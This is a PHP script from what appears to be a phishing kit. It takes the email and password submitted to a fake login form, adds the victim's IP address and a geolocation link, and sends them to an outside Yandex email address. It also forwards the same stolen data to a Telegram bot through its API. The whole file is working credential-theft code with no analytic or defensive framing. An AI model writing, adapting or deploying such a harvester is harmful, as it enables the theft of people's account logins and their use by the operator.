<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "jokersudo@yandex.com";
		
		
         $subject = "Loggies From SUDOJOKER : $ip";
		 $message .= "--------------KILLER Info-----------------------\r\n";
		 $message =  "Email ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		 $header = "Content type: GUNPLAY \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 $message .= "|--------------- I N F O | I P -------------------|\r\n";
		 $message .= "|Client IP: ".$ip."\r\n";
		 $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\r\n";
		 $message .= "User Agent : ".$useragent."\r\n";
		 $message .= "|----------- KILLED SUDO --------------|\r\n";
		 mail ($to,$subject,$message,$header);

		 
		 mail($send, $subject, $message);   
		 
			 // Send to Telegram bot
		 $telegramToken = "";
		 $chatId = "";
		 $text = urlencode($message);
		 
		 $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=$text";
		 
			 // Use cURL for making the HTTP request to Telegram API
			 if (function_exists('curl_version')) {
				 $ch = curl_init();
				 curl_setopt($ch, CURLOPT_URL, $url);
				 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				 $response = curl_exec($ch);
				 curl_close($ch);
			 } else {
				 // Fallback to file_get_contents if cURL is not available
				 $response = file_get_contents($url);
			 }
		 
			 // Optionally, decode and check the response for success or failure
			 // $responseData = json_decode($response, true);
			 // if ($responseData && $responseData["ok"]) {
			 //     // Message sent successfully
			 // } else {
			 //     // Log error or take corrective action
			 // }
		 }
		 
		 ?>